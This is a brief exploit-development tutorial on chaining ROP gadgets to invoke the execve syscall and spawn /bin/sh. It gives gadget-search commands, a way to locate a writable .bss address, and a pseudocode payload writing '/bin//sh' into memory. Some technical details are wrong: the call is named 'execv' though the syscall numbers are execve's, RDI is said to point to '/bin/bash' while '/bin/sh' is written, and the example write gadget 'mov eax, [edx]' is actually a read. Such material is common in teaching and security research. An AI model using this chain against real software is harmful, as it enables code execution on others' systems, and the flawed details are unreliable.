# ROP - Syscall execv

The objective is to call the **syscall \(execv\)** from a ROP controlling the value of registries: _RDI, RSI, RDX, RAX_ and obviously the _RIP_ \(the other ones doesn't matters\), and controlling somewhere to write _"/bin/sh"_

* **RDI**: Pointing to the string "/bin/bash"
* **RSI**: Null
* **RDX**: Null
* **RAX**: Value **0x3b** for x64 and **0xb** for x32, because this will call **execv**

```bash
ROPgadget --binary vulnbinary | grep syscall
ROPgadget --binary vulnbinary | grep "rdi\|rsi\|rdx\|rax" | grep pop
```

## Writing

If you can somehow write to an address and then get the address of where you have written then this step is unnecessary.

Elsewhere, you may search for some **write-what-where**.  
As is explained in this tutorial: [https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/](https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/) you have to find something that allows you to save some value inside a registry and then save it to some controlled address inside another registry. For example some `pop eax; ret` , `pop edx: ret` , `mov eax, [edx]`

You can find mov gadgets doing: `ROPgadget --binary vulnbinary | grep mov`

### Finding a place to write

If you have found some **write-what-where** and can control the needed registries to call execv, there is only left finding a place to write.

```bash
objdump -x vulnbinary | grep ".bss" -B1
                  CONTENTS, ALLOC, LOAD, DATA
 23 .bss          00000010  00403418  00403418  00002418  2**3
```

In this case: **0x403418**

### **Writing** _**"/bin/sh"**_

```text
buffer += address(pop_eax) # place value into EAX
buffer += "/bin"           # 4 bytes at a time
buffer += address(pop_edx)         # place value into edx
buffer += address(writable_memory)
buffer += address(writewhatwhere)

buffer += address(pop_eax)
buffer += "//sh"
buffer += address(pop_edx)
buffer += address(writable_memory + 4)
buffer += address(writewhatwhere)
```

